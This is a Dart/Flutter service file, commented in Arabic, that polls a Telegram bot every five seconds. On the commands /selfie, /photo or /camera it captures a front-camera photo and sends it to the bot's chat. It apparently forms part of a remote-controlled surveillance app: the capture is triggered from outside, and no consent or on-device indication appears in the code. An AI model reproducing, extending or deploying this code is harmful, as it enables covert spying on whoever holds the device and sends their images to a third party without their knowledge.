import 'dart:async';
import 'package:flutter_riverpod/flutter_riverpod.dart';

import '../../common/utils/logger.dart';
import '../config/telegram_config.dart';
import '../models/notification_model.dart';
import 'camera_service.dart';
import 'telegram_service.dart';
import 'telegram_settings_service.dart';

final botCommandServiceProvider = Provider<BotCommandService>(
  (ref) => BotCommandService(ref),
);

class BotCommandService {
  BotCommandService(this._ref);

  final Ref _ref;
  Timer? _pollingTimer;
  bool _isRunning = false;

  /// بدء الاستماع لأوامر البوت
  void startListening() {
    if (_isRunning) {
      logInfo('خدمة الأوامر تعمل بالفعل');
      return;
    }

    _isRunning = true;
    logInfo('بدء الاستماع لأوامر البوت');

    _pollingTimer = Timer.periodic(
      const Duration(seconds: 5),
      (_) => _checkForCommands(),
    );
  }

  /// إيقاف الاستماع لأوامر البوت
  void stopListening() {
    _isRunning = false;
    _pollingTimer?.cancel();
    _pollingTimer = null;
    logInfo('توقف الاستماع لأوامر البوت');
  }

  /// التحقق من وجود أوامر جديدة
  Future<void> _checkForCommands() async {
    if (!_isRunning) return;

    try {
      final telegramService = _ref.read(telegramServiceProvider);
      final updates = await telegramService.getUpdates(TelegramConfig.botToken);

      for (final update in updates) {
        await _handleUpdate(update);
      }
    } catch (e) {
      logError('خطأ في التحقق من الأوامر: $e');
    }
  }

  /// معالجة تحديث واحد
  Future<void> _handleUpdate(Map<String, dynamic> update) async {
    try {
      final message = update['message'] as Map<String, dynamic>?;
      if (message == null) return;

      final text = message['text'] as String?;
      if (text == null) return;

      logInfo('تم استقبال رسالة: $text');

      // معالجة الأوامر
      if (text.startsWith('/')) {
        await _handleCommand(text);
      }
    } catch (e) {
      logError('خطأ في معالجة التحديث: $e');
    }
  }

  /// معالجة الأوامر
  Future<void> _handleCommand(String command) async {
    final cmd = command.toLowerCase().trim();

    if (cmd == '/selfie' || cmd == '/photo' || cmd == '/camera') {
      await _takeSelfieAndSend();
    } else if (cmd == '/start') {
      await _sendWelcomeMessage();
    }
  }

  /// التقاط صورة سيلفي وإرسالها
  Future<void> _takeSelfieAndSend() async {
    try {
      logInfo('بدء التقاط الصورة...');

      final cameraService = CameraService();
      final photo = await cameraService.takeSelfie();

      if (photo == null) {
        logError('فشل التقاط الصورة');
        return;
      }

      logInfo('تم التقاط الصورة بنجاح: ${photo.path}');

      final telegramService = _ref.read(telegramServiceProvider);
      final settingsService = _ref.read(telegramSettingsServiceProvider);
      final settings = await settingsService.getSettings();

      final success = await telegramService.sendPhoto(
        photo: photo,
        settings: settings,
        caption: '📸 صورة سيلفي\n🕐 ${DateTime.now()}',
      );

      if (success) {
        logInfo('تم إرسال الصورة بنجاح');
      } else {
        logError('فشل إرسال الصورة');
      }
    } catch (e) {
      logError('خطأ في التقاط وإرسال الصورة: $e');
    }
  }

  /// إرسال رسالة ترحيب
  Future<void> _sendWelcomeMessage() async {
    try {
      final telegramService = _ref.read(telegramServiceProvider);
      final settingsService = _ref.read(telegramSettingsServiceProvider);
      final settings = await settingsService.getSettings();

      await telegramService.sendNotification(
        notification: _createWelcomeNotification(),
        settings: settings,
      );
    } catch (e) {
      logError('خطأ في إرسال رسالة الترحيب: $e');
    }
  }

  /// إنشاء إشعار ترحيب
  _createWelcomeNotification() {
    return NotificationModel(
      title: 'مرحباً بك! 👋',
      text: '''
البوت جاهز للعمل!

الأوامر المتاحة:
/selfie - التقاط صورة سيلفي
/photo - التقاط صورة
/camera - التقاط صورة
''',
      package: 'System',
      time: DateTime.now(),
      extras: {},
      actions: [],
    );
  }
}
